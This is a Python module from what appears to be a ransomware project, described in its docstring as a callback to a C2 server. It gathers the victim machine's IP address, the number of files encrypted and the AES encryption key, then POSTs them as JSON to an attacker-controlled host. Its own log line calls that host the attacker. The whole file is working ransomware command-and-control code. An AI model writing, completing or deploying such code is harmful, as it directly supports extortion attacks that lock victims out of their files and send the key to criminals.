"""
Calback to C2 server.
"""

import json
import socket
import urllib.request
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path

import config
from utils.logger import get_logger


@dataclass
class C2Report:
    ip: str
    file_encrypted: int
    key: str
    duration: float
    timestamp: str


class C2Integration:
    def __init__(
        self,
        c2_host: str | None = None,
        c2_port: int | None = None,
        log_file: Path | None = None,
    ):
        self._host = c2_host or config.CALLBACK_SERVER_HOST
        self._port = c2_port or config.CALLBACK_SERVER_PORT

        self._logger = get_logger(__name__, log_file=log_file)

    def _to_payload(
        self,
        aes_key: str,
        file_encrypted: int,
        duration: float,
    ):
        return C2Report(
            ip=socket.gethostbyname(socket.gethostname()),
            key=aes_key,
            file_encrypted=file_encrypted,
            duration=duration,
            timestamp=datetime.now(timezone.utc).isoformat(),
        )

    def send(
        self,
        payload: C2Report,
    ):
        payload_str = json.dumps(asdict(payload), indent=2, ensure_ascii=False)
        try:
            req = urllib.request.Request(
                url=f"http://{self._host}: {self._port}/callback",
                data=payload_str.encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                },
                method="POST",
            )
            self._logger.debug("Sending callback data to atacker: %s", payload_str)
            urllib.request.urlopen(url=req, timeout=300)
            self._logger.debug(
                "Callbacked sent",
            )
        except Exception as e:
            self._logger.exception(e)
